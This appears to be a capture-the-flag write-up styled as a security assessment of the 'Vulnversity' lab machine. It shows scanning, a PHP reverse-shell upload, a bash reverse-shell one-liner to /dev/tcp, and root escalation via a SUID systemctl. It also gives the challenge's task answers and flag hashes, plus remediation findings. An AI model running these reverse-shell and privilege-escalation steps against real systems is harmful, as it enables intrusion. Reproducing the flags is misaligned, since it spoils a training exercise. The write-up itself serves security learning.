__  __          _  __          _____   ______      _ 
 |  \/  |   /\   | |/ /    /\    |  __ \ / __ \ \    / /
 | \  / |  /  \  | ' /    /  \   | |__) | |  | \ \  / / 
 | |\/| | / /\ \ |  <    / /\ \  |  _  /| |  | |\ \/ /  
 | |  | |/ ____ \| . \  / ____ \ | | \ \| |__| | \  /   
 |_|  |_/_/    \_\_|\_\/_/    \_\_|  \_\\____/   \/

╔════════════════════════════════════════════════════════════════════════╗
║                   SECURITY ASSESSMENT REPORT                           ║
║                       TARGET: 10.112.171.149                           ║
║                       MACHINE NAME: VULNVERSITY                        ║
║                       OPERATOR: makarov_XSec                           ║
╚════════════════════════════════════════════════════════════════════════╝

[+] PHASE 01 & 02: ENUMERATION & EXPLOITATION
----------------------------------------------------------------------------------------------------------------------
| STEP              | COMMAND / METHOD                                           | RESULT                     |
|-------------------|------------------------------------------------------------|----------------------------|
| 1. ICMP Check     | ping -c 1 10.112.171.149                                   | Host Alive (64 bytes)      |
| 2. Full Port Scan | nmap -p- -sS -sC -sV --open --min-rate=2000 10.112.171.149 | 21, 22, 139, 445, 3128, 3333|
| 3. Directory Brute| gobuster dir -u http://IP:3333/ -w medium.txt -x php,txt   | Found /internal/ (301)     |
| 4. Initial Access | Upload vulnversity.phtml (PHP Reverse Shell)               | Connection on Port 443     |
| 5. Shell Stabilize| bash -c "sh -i >& /dev/tcp/IP/444 0>&1"                    | TTY Established (Port 444) |
| 6. PrivEsc Search | find / -perm -4000 2>/dev/null                             | SUID: /bin/systemctl       |
| 7. Root Access    | Systemctl Service Exploitation (chmod +s /bin/bash)        | ACCESS GRANTED (ROOT)      |
----------------------------------------------------------------------------------------------------------------------

[+] PHASE 03: TASK ANSWERS
----------------------------------------------------------------------------------------------------------------------
| ID | QUESTION                                  | ANSWER                                                     |
|----|-------------------------------------------|------------------------------------------------------------|
| 01 | Scan the box, how many ports are open?    | 6                                                          |
| 02 | What version of the squid proxy is running?| 4.10                                                       |
| 03 | How many ports will nmap scan if the -p-400| 400                                                        |
| 04 | What is the most likely operating system?  | Ubuntu Linux                                               |
| 05 | What port is the web server running on?    | 3333                                                       |
| 06 | What is the directory for upload form?     | /internal/                                                 |
| 07 | USER FLAG                                 | 8bd7992fbe8a6ad22a63361004cfcedb                           |
| 08 | ROOT FLAG                                 | a58ff8579f0a9270368d33a9966c7fd5                           |
----------------------------------------------------------------------------------------------------------------------

[+] PHASE 04: VULNERABILITY DISCLOSURE
----------------------------------------------------------------------------------------------------------------------
1. FINDING: Unrestricted File Upload (Critical)
   DETAILS: El directorio /internal/ permitía subir extensiones ejecutables como .phtml, saltando el filtro básico.
   FIX: Implementar whitelist estricta de extensiones y escanear archivos subidos.

2. FINDING: Misconfigured SUID Binary (Critical)
   DETAILS: /bin/systemctl tenía el bit SUID activo, permitiendo escalar a root a través de servicios.
   FIX: Eliminar el bit SUID de binarios que no requieran privilegios elevados.

3. FINDING: Outdated Software (Medium)
   DETAILS: Servicios como vsftpd 3.0.5 y Apache 2.4.41 están desactualizados.
   FIX: Actualizar los servicios del sistema y aplicar parches de seguridad.

----------------------------------------------------------------------------------------------------------------------
[!] END OF DOCUMENT - makarov_XSec - CONFIDENTIAL